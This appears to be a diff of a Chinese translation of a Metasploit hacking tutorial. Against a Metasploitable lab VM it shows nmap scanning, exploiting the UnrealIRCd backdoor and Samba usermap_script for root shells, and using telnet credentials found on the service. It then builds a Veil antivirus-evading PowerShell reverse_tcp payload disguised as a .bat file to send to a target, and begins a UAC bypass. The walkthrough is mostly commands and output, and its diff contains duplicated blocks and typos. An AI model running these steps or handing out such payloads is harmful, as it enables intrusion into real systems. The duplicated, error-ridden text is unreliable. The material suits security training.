+`512/tcp` open oc
+
+`513/tcp` open login
+
+`514/tcp` open shell
+
+`1099/tcp` open rmireistry
+
+`1524/tcp` open ingresslock
+
+`2049/tcp` open nfs
+
+`2121/tcp` open cpproxy-ftp
+
+`3306/tcp` open mysql
+
+`5432/tcp` open postgres
+
+`5900/tcp` open vnc
+
+`6348/tcp` open x11
+
+`6667/tcp` open irc
+
+`8080/tcp` open ajp13
+
+`8180/tcp` open unknown
+
+MAC Address: `00:0c:29:07:64:4E` (VMware)
 
 Nmap done: 1 IP address [1 host up] scanned in 0.14 seconds
-```
 
 有很多开放的端口！
 
-好了，我们确实有很多可能的突破口；让我们看看能否找到这些端口上运行着哪些服务。再次尝试 nmap 命令，但这次添加“-A”开关，它将执行 OS 探测并尝试确定服务版本：
+好了，我们确实有很多可能的突破口；让我们看看能否找到这些端口上运行着哪些服务。再次尝试 `nmap` 命令，但这次添加 `-A` 开关，它将执行 OS 探测并尝试确定服务版本：
 
 ```
 nmap -sS -Pn -A 192.168.198.145
 ```
 
-Nmap 将运行一会儿，因为它正在尝试检测这些端口上运行的实际服务。几分钟后，你会看到一个类似这样的屏幕：
+`Nmap` 将运行一会儿，因为它正在尝试检测这些端口上运行的实际服务。几分钟后，你会看到一个类似这样的屏幕：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_82_0.png)
 
@@ -1707,11 +1793,11 @@ Nmap 将运行一会儿，因为它正在尝试检测这些端口上运行的实
 
 所以，让我们看看关于 Unreal 服务能发现什么。
 
-在图中我们可以看到服务版本，在这种情况下是 *Unreal IRC 3.2.8.1*。我们的下一步是搜索该软件版本的漏洞。只需在 Google 上搜索“unreal3.2.8.1 exploits”就能解决。
+在图中我们可以看到服务版本，在这种情况下是 `Unreal IRC 3.2.8.1`。我们的下一步是搜索该软件版本的漏洞。只需在 Google 上搜索 "unreal3.2.8.1 exploits" 就能解决。
 
 但既然可以在 Metasploit 中搜索，为什么还要用 Google 呢？
 
-# 攻击 Unreal 服务
+## 攻击 Unreal 服务
 
 让我们继续运行 Metasploit：
 
@@ -1719,10 +1805,11 @@ Nmap 将运行一会儿，因为它正在尝试检测这些端口上运行的实
 root@kali:~# msfconsole
 ```
 
-现在使用 search 命令并粘贴服务名称和版本：
+现在使用 `search` 命令并粘贴服务名称和版本：
 
 ```
 msf > search Unreal 3.2.8.1
+```
 
 运行此搜索返回：
 
@@ -1730,22 +1817,22 @@ msf > search Unreal 3.2.8.1
 exploit/unix/unreal_ircd_3281_backdoor   2010-06-12      excellent Unreal CD 3.2.8.1 Backdoor Command Execution
 ```
 
-Unreal 3.2.8.1 backdoor 的可靠性为“excellent”！这是一个好消息，因为漏洞根据成功概率和稳定性进行了排名。
+Unreal 3.2.8.1 backdoor 的可靠性为 "excellent"！这是一个好消息，因为漏洞根据成功概率和稳定性进行了排名。
 
 如果你记得我们在 Metasploit 中的介绍，攻击漏洞有几个步骤：
 
--   选择漏洞 (Picking an Exploit)
--   设置漏洞选项 (Setting Exploit Options)
--   选择负载 (Picking a Payload)
--   设置负载选项 (Setting Payload Options)
--   运行漏洞 (Running the Exploit)
--   连接到远程系统 (Connecting to the Remote System)
+- 选择漏洞 (Picking an Exploit)
+- 设置漏洞选项 (Setting Exploit Options)
+- 选择负载 (Picking a Payload)
+- 设置负载选项 (Setting Payload Options)
+- 运行漏洞 (Running the Exploit)
+- 连接到远程系统 (Connecting to the Remote System)
 
 让我们进入该过程。
 
-# 选择漏洞
+## 选择漏洞
 
-如果我们使用“info” 命令，可以发现更多关于可能漏洞的信息。
+如果我们使用 `info` 命令，可以发现更多关于可能漏洞的信息。
 
 ```
 msf > exploit/unix/unreal_ircd_3281_backdoor
@@ -1755,9 +1842,9 @@ msf > exploit/unix/unreal_ircd_3281_backdoor
 
 | Description |
 | :--- |
-| 该模块利用一个被添加到 Unreal IRCD 3.2.8.1 下载存档中的恶意后门。该后门存在于2009 年 11 月到 2010 年 6 月之间的 Unreal3.2.8.1.tar.gz 存档中。 |
+| 该模块利用一个被添加到 Unreal IRCD 3.2.8.1 下载存档中的恶意后门。该后门存在于2009 年 11 月到 2010 年 6 月之间的 `Unreal3.2.8.1.tar.gz` 存档中。 |
 
-难以如此，让我们执行“use exploit/unix/unreal_ircd_3281_backdoor”并检查选项：
+难以如此，让我们执行 `use exploit/unix/unreal_ircd_3281_backdoor` 并检查选项：
 
 ```
 msf > use exploit/unix/unreal_ircd_3281_backdoor > show options
@@ -1768,21 +1855,21 @@ RHOST                                 yes           The target address
 RPORT           6667             yes           The target port
 ```
 
-# 设置漏洞选项
+## 设置漏洞选项
 
 你可以看到有很多选项需要设置。只需要远程主机地址：
 
--   set RHOST 192.168.198.145 (Metasploit IP 地址)
+- `set RHOST 192.168.198.145` (Metasploit IP 地址)
 
-# 选择负载
+## 选择负载
 
-现在我们需要选择一个负载。输入“show payloads”显示所有与漏洞兼容的负载：
+现在我们需要选择一个负载。输入 `show payloads` 显示所有与漏洞兼容的负载：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_84_0.png)
 
 遗憾的是它们都是命令 shell。Metpreter shell 比命令 shell 好，但现在我们只使用通用的 reverse。漏洞完成后，这将直接带我们进入目标的终端。现在，输入：
 
--   set payload cmd/unix/reverse
+- `set payload cmd/unix/reverse`
 
 ```
 msf exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
@@ -1803,9 +1890,9 @@ Payload options (cmd/unix/reverse):
 | LHOST | 192.168.198.146 | yes | The listen address |
 | LPORT | 4444 | yes | The listen port |
 
-# 设置负载选项
+## 设置负载选项
 
-对于这个负载，我们需要设置 LHOST（你的 Kali Metasploit 系统的 IP），然后执行“show options”以确保一切设置正确：
+对于这个负载，我们需要设置 `LHOST`（你的 Kali Metasploit 系统的 IP），然后执行 `show options` 以确保一切设置正确：
 
 ```
 msf exploit(unreal_ircd_3281_backdoor) > set lhost 192.168.198.146
@@ -1827,11 +1914,9 @@ Payload options (cmd/unix/reverse):
 | LHOST | 192.168.198.146 | yes | The listen address |
 | LPORT | 4444 | yes | The listen port |
 
-我们的 RHOST（目标）和（Kali 系统）值已设置正确。
+我们的 `RHOST`（目标）和（Kali 系统）值已设置正确。
 
-万一切就绪，现在只需输入“exploit”：
-
-
+万一切就绪，现在只需输入 `exploit`：
 
 ```bash
 msf exploit(unreal_ircd_321_backdoor) > exploit
@@ -1861,7 +1946,7 @@ whoami
 root
 ```
 
-如你上方所示，我输入了 *whoami*，目标系统响应为 *root*。Root 用户是你在 Linux 机器上可以拥有的最高级别用户。
+如你上方所示，我输入了 `whoami`，目标系统响应为 `root`。Root 用户是你在 Linux 机器上可以拥有的最高级别用户。
 
 成功了！
 
@@ -1871,11 +1956,11 @@ root
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_87_0.png)
 
-我们必须破解密码文件才能获取实际的密码；我们将在“密码攻击”章节中查看这一点。
+我们必须破解密码文件才能获取实际的密码；我们将在 "密码攻击" 章节中查看这一点。
 
 ## 结论
 
-在本章中，我们学习了如何使用 nmap 查找测试系统上的开放端口。我们还学习了如何发现这些端口上运行着哪些服务。然后，我们发现了如何发现并针对漏洞服务使用利用程序（exploit）。
+在本章中，我们学习了如何使用 `nmap` 查找测试系统上的开放端口。我们还学习了如何发现这些端口上运行着哪些服务。然后，我们发现了如何发现并针对漏洞服务使用利用程序（exploit）。
 
 接下来，我们将快速查看 Metasploit 内置的一些扫描器，它们可以帮助我们发现并利用特定的服务。
 
@@ -1883,9 +1968,9 @@ root
 
 ## 引言
 
-在上一章中，我们查看了使用 Nmap 扫描系统以寻找开放端口和服务。这次我们将查看 Metasploit 自带的一些辅助扫描器（auxiliary scanners）。
+在上一章中，我们查看了使用 `Nmap` 扫描系统以寻找开放端口和服务。这次我们将查看 Metasploit 自带的一些辅助扫描器（auxiliary scanners）。
 
-运行 nmap 扫描为我们产生了大量的开放端口供我们选择。许多人不知道的是，Metasploit 自带大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索并恢复服务信息！
+运行 `nmap` 扫描为我们产生了大量的开放端口供我们选择。许多人不知道的是，Metasploit 自带大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索并恢复服务信息！
 
 让我们开始吧！
 
@@ -1893,7 +1978,7 @@ root
 
 ## 使用扫描器
 
-要找到可用的扫描器，只需在 Kali 命令行提示符运行“msfconsole”。在 Metasploit 启动后，在提示符处输入“search scanner”：
+要找到可用的扫描器，只需在 Kali 命令行提示符运行 `msfconsole`。在 Metasploit 启动后，在提示符处输入 `search scanner`：
 
 ```bash
 msf > search scanner
@@ -1912,7 +1997,7 @@ Matching Modules
 
 向下阅读这个庞大的列表以查看可用内容。
 
-在本教程中，我们将注意力缩小发现的常用端口上。作为复习，这里是上章执行的 nmap 扫描结果：
+在本教程中，我们将注意力缩小发现的常用端口上。作为复习，这里是上章执行的 `nmap` 扫描结果：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_88_0.png)
 
@@ -1932,12 +2017,12 @@ Matching Modules
 | auxiliary/scanner/ssh/ssh_version | normal | SSH 版本扫描器 |
 ```
 
-注意有几个可用的模块。我们现在只需要寻找版本信息，因此我们将使用“auxiliary/scanner/ssh/ssh_version”模块。
+注意有几个可用的模块。我们现在只需要寻找版本信息，因此我们将使用 `auxiliary/scanner/ssh/ssh_version` 模块。
 
-1. 输入，“use auxiliary/scanner/ssh/ssh_version”
-2. 然后输入“show options”查看可以使用哪些选项。
-3. 在这种情况下，我们需要做的只是“set RHOSTS <IP>”或远程主机，即我们的目标。
-4. 然后只需输入“exploit”即可运行。
+1. 输入 `use auxiliary/scanner/ssh/ssh_version`
+2. 然后输入 `show options` 查看可以使用哪些选项。
+3. 在这种情况下，我们需要做的只是 `set RHOSTS <IP>` 或远程主机，即我们的目标。
+4. 然后只需输入 `exploit` 即可运行。
 
 ```bash
 msf > auxiliary/scanner/ssh/ssh_version
@@ -1959,15 +2044,17 @@ auxiliary(ssh_version) >
 
 我们看到目标确实运行着 SSH 服务器并看到了版本：
 
-“SSH-2.0-OpenSSH-4.7p1 Debian-8”
+`SSH-2.0-OpenSSH-4.7p1 Debian-8`
 
-我们现在可以使用此信息寻找利用程序。注意远程主机的命令是复数的 RHOSTS，我们可以输入整个系统范围，从而快速地扫描整个网络以发现 ssh 服务器。现在有了 SSH 版本号，我们可以尝试寻找它的利用程序，或者使用另一个辅助模块“auxiliary/scanner/ssh_login”来尝试破解密码。我们将此留到
+
+
+我们现在可以使用此信息寻找利用程序。注意远程主机的命令是复数的`RHOSTS`，我们可以输入整个系统范围，从而快速地扫描整个网络以发现 ssh 服务器。现在有了 SSH 版本号，我们可以尝试寻找它的利用程序，或者使用另一个辅助模块`auxiliary/scanner/ssh_login`来尝试破解密码。我们将此留到后面再讨论。
 
 ## 使用其他扫描器
 
 某些扫描器返回的信息与其他不同。
 
-## MySQL
+### MySQL
 
 例如，如果我们使用 MySQL 扫描，会得到这些：
 
@@ -1990,13 +2077,13 @@ msf(mysql_version) > exploit
 msf(mysql_version) >
 ```
 
-扫描显示正在运行 5.0.51。
+扫描显示正在运行 MySQL 5.0.51。
 
-但其他的可以揭一些有趣的信息。例如，让我们看看 Telnet。
+但其他的扫描器可以揭示一些有趣的信息。例如，让我们看看 Telnet。
 
-## TELNET
+### TELNET
 
-Telnet 扫描器可以用两种不同的方式工作。如果我们使用用户名和密码，它将尝试登录。如果没有，它将仅获取 banner（标志信息）。注意这与我们目前涵盖的其他不同。
+Telnet 扫描器可以用两种不同的方式工作。如果我们使用用户名和密码，它将尝试登录。如果没有，它将仅获取 banner（标志信息）。注意这与我们目前涵盖的其他扫描器不同。
 
 ```bash
 msf > auxiliary/scanner/telnet/telnet_version
@@ -2017,7 +2104,7 @@ Escape character is '}'.
 Password:
 ```
 
-现在，当我们输入 exploit 时，我们看到了这些：
+现在，当我们输入`exploit`时，我们看到了这些：
 
 ```bash
 auxiliary(telnet_version) > exploit
@@ -2035,7 +2122,7 @@ auxiliary(telnet_version) > exploit
 
 就像一堆文字，没有任何提示运行的是什么层次的软件。但如果我们观察得仔细，我们可以看到其他的：
 
-**Login with msfadmin/msfadmin to get started**
+`Login with msfadmin/msfadmin to get started`
 
 “Login with msfadmin/msfadmin to get started”，看起来他们在 Telnet 页面上提供了登录凭据：
 
@@ -2061,112 +2148,7 @@ msfadmin@metasploitable:~$
 
 我们进来了！
 
-
-
-
-如果我们运行 `id` 命令，我们可以看到该用户（主用户）属于多个组：
-
-```
-$ msfadin@metasploitable: $ id
-uid=1000(msfadin) gid=1000(msfadin) groups=4(adm),28(dialout),24(cdrom),25(flamingo),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(ladman),112(admin),199(bashhare),1000(msfadin) $
-msfadin@metasploitable: $
-```
-
-我们可能利用这些信息来进一步利用其他服务。
-
-公司在服务登录页面上包含登录凭据听起来有些不可置信，但无论你信信不信，这在现实生活中发生的次数比你想象的要多。
-
-## 扫描地址范围
-
-同样有趣的是通过这些扫描程序，我们有不同的选项可以设置。例如，让我们运行 SMB 扫描器：
-
-![](img/ff9cd19afe449ae54278ee429e668a6f_92_0.png)
-
-好的，我们将 `RHOSTS` 设置为 `192.168.198.145`，它扫描了该地址并返回了运行上面的 Samba 版本。
-
-但如果我们想扫描整个网络以寻找运行 Samba 的系统呢？
-
-这就是 `RHOSTS` 命令的妙之处。你不需要只扫描单个主机，而是可以扫描 `192.168.198.0` 网络上的所有 256 个客户端。
-
-我们使用完全相同的命令，但如下所示修改 `RHOSTS` 命令：
-
-```
-msf use auxiliary/scanner/smb/smb_version
-set HOSTS 192.168.198.0/24
-HOSTS => 192.168.198.0
-set THREADS 255
-msf auxiliary(smb_version) > 
-[*] 192.168.198.145 is running Windows 7 7601 Service Pack (Build 1) (name:GAME PC) (domain:WORKGROUP)
-[*] 192.168.198.145-45 is running Unix Samba 3.0.20-Debian (language: Unknown) GROUP
-[*] Scanned 165 of 256 hosts (64% complete)
-[*] Scanned 170 of 256 hosts (66% complete)
-[*] Scanned 169 of 256 hosts (66% complete)
-[*] Scanned 219 of 256 hosts (85% complete)
-[*] Scanned 240 of 256 hosts (93% complete)
-[*] Scanned 242 of 256 hosts (94% complete)
-[*] Scanned 252 of 256 hosts (98% complete)
-[*] Scanned 252 of 256 hosts (98% complete)
-[*] Scanned 254 of 256 hosts (99% complete)
-[*] Scanned 256 of 256 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf auxiliary(smb_version) >
-```
-
-现在它注意到扫描了网络上的所有 256 个主机，并发现位于 `192.168.198.145` 的 Metasploitable 2 机器运行着 Samba。
-
-如果你只是扫描网络上运行的某些服务，这会让事情变得简单得多。`threads` 命令默认设置为“1”。如果你扫描本地局域网（LAN），可以将其增加到 50 以提高速度，或者在测试远程网络时进行相应调整。
-
-## 利用 Samba 服务
-
-既然已经到了，让我们来看看如何利用 Samba (SMB) 服务。这将让我们有更多运行漏洞利用（exploits）的，并帮助我们发现和利用漏洞服务。
-
-我们从刚才运行的扫描器中知道 SMB 服务版本是 Unix Samba 3.0.20。让我们快速在 Google 上搜索一下看看能找到什么：
-
-![](img/ff9cd19afe449ae54278ee429e668a6f_93_0.png)
-
-第一个返回结果是一个“用户名映射脚本（username map script）”问题。
-
-让我们尝试一下看看结果如何。
-
-继续搜索 `samba/usermap`：
-
-```
-msf> search sambamap/
-Matching Modules
-=================
-Name                             Disclosure Date      Rank
-----                             --------------- -----
-exploit/multi/samba/usermap_script 2007-05-14 00:00:00 UTC excellent
-script" Command Execution"
-```
-
-从上面的图片可以看到，其等级是“excellent（优秀）”。
-
-让我们对它使用 `info` 命令看看它怎么说：
-
-```
-msf> info exploit/multi/samba/usermap_script
-```
-
-```
-Basic options:
-Name             Current Setting  Description
-----             ---------------  -----------
-RHOST             ---               The target address
-RPORT             139              yes             The target port
-
-Payload information:
-Space: 102
-
-Description:
-This module exploits a username map script vulnerability in Samba versions 3.0.20.
-```
-
-从上面的图片可以看到等级是“excellent”。
-
-（注：由于原文后部分存在大量重复块，此处已根据唯一内容进行清理翻译。）
-
-如果我们运行 `id` 命令，我们可以看到该用户（主用户）属于多个组：
+如果我们运行`id`命令，我们可以看到该用户（主用户）属于多个组：
 
 ```
 $ msfadin@metasploitable: $ id
@@ -2184,13 +2166,13 @@ msfadin@metasploitable: $
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_92_0.png)
 
-好的，我们将 `RHOSTS` 设置为 `192.168.198.145`，它扫描了该地址并返回了运行上面的 Samba 版本。
+好的，我们将`RHOSTS`设置为`192.168.198.145`，它扫描了该地址并返回了运行上面的 Samba 版本。
 
 但如果我们想扫描整个网络以寻找运行 Samba 的系统呢？
 
-这就是 `RHOSTS` 命令的妙之处。你不需要只扫描单个主机，而是可以扫描 `192.168.198.0` 网络上的所有 256 个客户端。
+这就是`RHOSTS`命令的妙之处。你不需要只扫描单个主机，而是可以扫描`192.168.198.0`网络上的所有 256 个客户端。
 
-我们使用完全相同的命令，但如下所示修改 `RHOSTS` 命令：
+我们使用完全相同的命令，但如下所示修改`RHOSTS`命令：
 
 ```
 msf use auxiliary/scanner/smb/smb_version
@@ -2214,9 +2196,9 @@ msf auxiliary(smb_version) >
 msf auxiliary(smb_version) >
 ```
 
-现在它注意到扫描了网络上的所有 256 个主机，并发现位于 `192.168.198.145` 的 Metasploitable 2 机器运行着 Samba。
+现在它注意到扫描了网络上的所有 256 个主机，并发现位于`192.168.198.145`的 Metasploitable 2 机器运行着 Samba。
 
-如果你只是扫描网络上运行的某些服务，这会让事情变得简单得多。`threads` 命令默认设置为“1”。如果你扫描本地局域网（LAN），可以将其增加到 50 以提高速度，或者在测试远程网络时进行相应调整。
+如果你只是扫描网络上运行的某些服务，这会让事情变得简单得多。`threads`命令默认设置为“1”。如果你扫描本地局域网（LAN），可以将其增加到 50 以提高速度，或者在测试远程网络时进行相应调整。
 
 ## 利用 Samba 服务
 
@@ -2230,7 +2212,107 @@ msf auxiliary(smb_version) >
 
 让我们尝试一下看看结果如何。
 
-继续搜索 `samba/usermap`：
+继续搜索`samba/usermap`：
+
+```
+msf> search sambamap/
+Matching Modules
+=================
+Name                             Disclosure Date      Rank
+----                             --------------- -----
+exploit/multi/samba/usermap_script 2007-05-14 00:00:00 UTC excellent
+script" Command Execution"
+```
+
+从上面的图片可以看到，其等级是“excellent（优秀）”。
+
+让我们对它使用`info`命令看看它怎么说：
+
+```
+msf> info exploit/multi/samba/usermap_script
+```
+
+```
+Basic options:
+Name             Current Setting  Required  Description
+----             ---------------  --------  -----------
+RHOST             ---              yes       The target address
+RPORT             139              yes       The target port
+
+Payload information:
+Space: 102
+
+Description:
+This module exploits a username map script vulnerability in Samba versions 3.0.20.
+```
+
+从上面的图片可以看到等级是“excellent”。
+
+如果我们运行`id`命令，我们可以看到该用户（主用户）属于多个组：
+
+```
+$ msfadin@metasploitable: $ id
+uid=1000(msfadin) gid=1000(msfadin) groups=4(adm),28(dialout),24(cdrom),25(flamingo),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(ladman),112(admin),199(bashhare),1000(msfadin) $
+msfadin@metasploitable: $
+```
+
+我们可能利用这些信息来进一步利用其他服务。
+
+公司在服务登录页面上包含登录凭据听起来有些不可置信，但无论你信不信，这在现实生活中发生的次数比你想象的要多。
+
+## 扫描地址范围
+
+同样有趣的是通过这些扫描程序，我们有不同的选项可以设置。例如，让我们运行 SMB 扫描器：
+
+![](img/ff9cd19afe449ae54278ee429e668a6f_92_0.png)
+
+好的，我们将`RHOSTS`设置为`192.168.198.145`，它扫描了该地址并返回了运行上面的 Samba 版本。
+
+但如果我们想扫描整个网络以寻找运行 Samba 的系统呢？
+
+这就是`RHOSTS`命令的妙之处。你不需要只扫描单个主机，而是可以扫描`192.168.198.0`网络上的所有 256 个客户端。
+
+我们使用完全相同的命令，但如下所示修改`RHOSTS`命令：
+
+```
+msf use auxiliary/scanner/smb/smb_version
+set HOSTS 192.168.198.0/24
+HOSTS => 192.168.198.0
+set THREADS 255
+msf auxiliary(smb_version) > 
+[*] 192.168.198.145 is running Windows 7 7601 Service Pack (Build 1) (name:GAME PC) (domain:WORKGROUP)
+[*] 192.168.198.145-45 is running Unix Samba 3.0.20-Debian (language: Unknown) GROUP
+[*] Scanned 165 of 256 hosts (64% complete)
+[*] Scanned 170 of 256 hosts (66% complete)
+[*] Scanned 169 of 256 hosts (66% complete)
+[*] Scanned 219 of 256 hosts (85% complete)
+[*] Scanned 240 of 256 hosts (93% complete)
+[*] Scanned 242 of 256 hosts (94% complete)
+[*] Scanned 252 of 256 hosts (98% complete)
+[*] Scanned 252 of 256 hosts (98% complete)
+[*] Scanned 254 of 256 hosts (99% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_version) >
+```
+
+现在它注意到扫描了网络上的所有 256 个主机，并发现位于`192.168.198.145`的 Metasploitable 2 机器运行着 Samba。
+
+如果你只是扫描网络上运行的某些服务，这会让事情变得简单得多。`threads`命令默认设置为“1”。如果你扫描本地局域网（LAN），可以将其增加到 50 以提高速度，或者在测试远程网络时进行相应调整。
+
+## 利用 Samba 服务
+
+既然已经到了，让我们来看看如何利用 Samba (SMB) 服务。这将让我们有更多运行漏洞利用（exploits）的练习，并帮助我们发现和利用漏洞服务。
+
+我们从刚才运行的扫描器中知道 SMB 服务版本是 Unix Samba 3.0.20。让我们快速在 Google 上搜索一下看看能找到什么：
+
+![](img/ff9cd19afe449ae54278ee429e668a6f_93_0.png)
+
+第一个返回结果是一个“用户名映射脚本（username map script）”问题。
+
+让我们尝试一下看看结果如何。
+
+继续搜索`samba/usermap`：
 
 ```
 msf> search sambamap/
@@ -2244,18 +2326,20 @@ script" Command Execution"
 
 从上面的图片可以看到，其等级是“excellent”。
 
-让我们对它使用 `info` 命令看看它怎么说：
+让我们对它使用`info`命令看看它怎么说：
 
 ```
 msf> info exploit/multi/samba/usermap_script
 ```
 
-```
+
+
+```text
 Basic options:
 Name             Current Setting  Description
 ----             ---------------  -----------
 RHOST             ---               The target address
-RPORT             139              yes             The target port
+RPORT             139               yes             The target port
 
 Payload information:
 Space: 102
@@ -2268,44 +2352,48 @@ This module exploits a username map script vulnerability in Samba versions 3.0.2
 
 （注：由于原文后部分存在大量重复块，此处已根据唯一内容进行逻辑流翻译。）
 
-## 第 9 章 - 使用 Veil 绕过杀毒
+# 第 9 章：使用 Veil 绕过杀毒
 
-### 资源
+## 资源
+
 - https://www.veil-evasion.com/powershell-payloads/
 
-### 简介
+## 简介
+
 我们已经快速查看了攻击 Linux；现在让我们来看看攻击 Windows 主机。
 
 ## 安装 Veil
-Veil 最近被添加到 Kali 中，如果在终端提示符处输入 `veil` 没有启动，说明它可能还没有安装。
 
-```
+Veil 最近被添加到 Kali 中，如果在终端提示符处输入`veil`没有启动，说明它可能还没有安装。
+
+```bash
 root@kali:/usr/share# apt-get update apt-get install veil
 ```
 
-- 2. 然后输入 `veil` 运行程序：
+2. 然后输入`veil`运行程序：
 
-```
+```bash
 root@kali:/usr/share# veil
 ```
 
 ## 使用 Veil
-第一要工作是使用 `list` 命令列出可用的负载：
+
+第一步是使用`list`命令列出可用的负载。
 
 负载是有评级的，由于我们将稍后讨论一些 PowerShell 攻击（在*社会工程*章节中），让我们使用 PowerShell 负载。
 
-只需使用 `use` 命令和负载的编号。在本教程中我们将使用 `powershell/VirtualAlloc` 负载：
+只需使用`use`命令和负载的编号。在本教程中我们将使用`powershell/VirtualAlloc`负载：
 
-- 1. 输入 `use 9`。
+1. 输入`use 9`。
 
+# Veil
 
+**版本：** `2.8.5`
 
+**Web：** https://www.veil-evasion.com/  
+**Twitter：** @veilevasion
 
-
-# Veil | [版本]: 2.8.5
-[Web]: https://www.veil-evasion.com/ | [Twitter]: @veilevasion
-
-```
+```text
 Payload: powershell/VirtualAlloc loaded
 Available commands:
 
@@ -2319,24 +2407,24 @@ back            返回主菜单
 [>] 请输入命令: _
 ```
 
-2. 我们将直接使用默认值，所以只需输入“generate”即可。
+2. 我们将直接使用默认值，所以只需输入`generate`即可。
 
-然后你可以选择使用 Metasploit 标准的 msvenom shellcode，或者选择你自己的。我们将选择默认的 msfvenom。
+然后你可以选择使用 Metasploit 标准的 `msvenom` shellcode，或者选择你自己的。我们将选择默认的 `msfvenom`。
 
-3. 输入“1”并按回车：
+3. 输入`1`并按回车：
 
-```
+```text
 [?] 使用 msfvenom 还是提供自定义 shellcode?
 1 - msfvenom (默认)
 2 - 自定义
 [>] 请输入你的选择数字: 1
 ```
 
-接下来选择 shell 的类型；我们将使用默认的 reverse_TCP。这意味着他们的计算机将连接到我们这里。
+接下来选择 shell 的类型；我们将使用默认的 `reverse_TCP`。这意味着他们的计算机将连接到我们这里。
 
 4. 只需按“回车”接受默认的 shell payload：
 
-```
+```text
 [*] 按 [enter] 执行 windows/meterpreter/reverse_tcp
 [*] 按 [tab] 列出可用的 payloads
 [>] 请输入 metasploit payload: _
@@ -2344,13 +2432,13 @@ back            返回主菜单
 
 5. 接下来 Veil 会要求输入你正在使用的主机的 IP 地址。输入你 Kali 机器的 IP 地址并按回车。
 
-```
+```text
 [>] 输入 'LHOST' 的值, [tab] 获取本地 IP: 192.168.198.137 _
 ```
 
 6. 然后输入你将要使用的本地端口。我选择使用端口 4000：
 
-```
+```text
 [>] 输入 'LPORT' 的值: 4000 _
 ```
 
@@ -2370,7 +2458,7 @@ Veil 现在拥有了它所需的内容并创建了我们的陷阱文件。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_99_0.png)
 
-```
+```text
 Language: powershell
 Payload: VirtualAlloc
 Shellcode: windows/meterpreter/reverse_tcp
@@ -2378,15 +2466,15 @@ Options: HOST=192.160.198.137 LPORT=4000
 Source File: /usr/share/veil/output/source/CutePuppy.bat
 ```
 
-```
+```text
 [*]  payload 已经生成，不要被抓到！
 [!] 不要向任何在线扫描器提交样本；
-[>] 按任意键返回主菜单: 
+[>] 按任意键返回主菜单:
 ```
 
-我们的文件将存储在“/usr/share/veil/output/source/”目录下。
+我们的文件将存储在`/usr/share/veil/output/source/`目录下。
 
-只需获取创建的 .bat 文件并发送给你的目标。当它运行时，它将尝试连接到我们的机器。
+只需获取创建的`.bat`文件并发送给你的目标。当它运行时，它将尝试连接到我们的机器。
 
 我们现在需要启动一个监听器（handler）来接受连接。
 
@@ -2394,10 +2482,11 @@ Source File: /usr/share/veil/output/source/CutePuppy.bat
 
 要创建远程监听器，我们将使用 Metasploit。
 
-- 1. 从菜单或终端 (msfconsole) 启动 Metasploit Framework。
-- 2. 现在使用以下界面设置 multi/handler：
+1. 从菜单或终端（`msfconsole`）启动 Metasploit Framework。
 
-```
+2. 现在使用以下界面设置 `multi/handler`：
+
+```text
 msf > use multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
@@ -2412,7 +2501,7 @@ msf exploit(handler) > exploit
 
 Metasploit 随后将启动监听器并等待连接：
 
-```
+```text
 [*] 在 192.168.198.137:4000 上启动反向监听器
 [*] 正在启动 payload 处理器...
 ```
@@ -2423,7 +2512,7 @@ Metasploit 随后将启动监听器并等待连接：
 
 在 Windows 7 机器上，如果执行了文件，我们将在 Kali 系统上看到这些：
 
-```
+```text
 [*] 在 192.168.198.137:4000 上启动反向监听器
 [*] 正在启动 payload 处理器...
 [*] 正在向 192.168.198.132 发送阶段 (22128 bytes)
@@ -2431,9 +2520,9 @@ Metasploit 随后将启动监听器并等待连接：
 meterpreter >
 ```
 
-反向 shell 会话！如果我们输入“shell”，就能看到我们拥有了一个完整的 shell：
+反向 shell 会话！如果我们输入`shell`，就能看到我们拥有了一个完整的 shell：
 
-```
+```text
 meterpreter > shell
 Process created.
 Microsoft [Version 6.1.7601]
@@ -2443,25 +2532,39 @@ C:\Users\Fred\Desktop>
 
 这应该证明你不能仅仅依靠防火墙和反病毒软件来免受在线威胁。不幸的是，很多网络安全取决于用户以及他们允许运行的内容。指示用户永远不要运行垃圾邮件中的任何程序或打开文件。阻止特定类型的文件进入或离开网络也是一个好主意。最后，使用网络安全监控有助于追踪发生了什么。
 
-# 第10 章 绕过 UAC 进行 Windows 权限提升
+# 第 10 章：绕过 UAC 进行 Windows 权限提升
 
-### 简介
+## 简介
 
-Windows 用户拥有许多权限，但某些操作只有管理员才能执行。Linux 用户有超级用户，而 Windows 有 System 用户。用户账户控制 (UAC) 在之前的版本中是个麻烦，许多公司关闭了它。UAC 在 Windows 7 中效果良好。在本节中，我们将学习如何绕过 UAC 将权限从管理员提升到系统。
+Windows 用户拥有许多权限，但某些操作只有管理员才能执行。Linux 用户有超级用户，而 Windows 有 System 用户。用户账户控制（UAC）在之前的版本中是个麻烦，许多公司关闭了它。UAC 在 Windows 7 中效果良好。在本节中，我们将学习如何绕过 UAC 将权限从管理员提升到系统。
 
 ## UAC 绕过
 
 在本教程中，我们将从具有管理员权限的 Windows 7 Meterpreter 会话开始：
 
-- 1. 首先等待会话。运行“sessions”命令看到唯一的活动会话是 1：![](img/ff9cd19afe449ae54278ee429e668a6f_101.png)
-- 2. 现在需要使用 bypassuac exploit：`msf exploit(handler) > exploit/windows/local/bypassuac`
-- 3. 输入“show options”查看我们需要提供的选项：![](img/ff9cd19afe449ae54278ee429e668a6f_102.png)
-- 4. 唯一的选项是“set session”。在此情况下设置为我们的活动会话 1：`msf exploit(handler) > set session 1`
-- 5. 最后输入“exploit”运行 bypassuac 模块：![](img/ff9cd19afe449ae54278ee429e668a6f_102.png)
+1. 首先等待会话。运行`sessions`命令看到唯一的活动会话是 1：
 
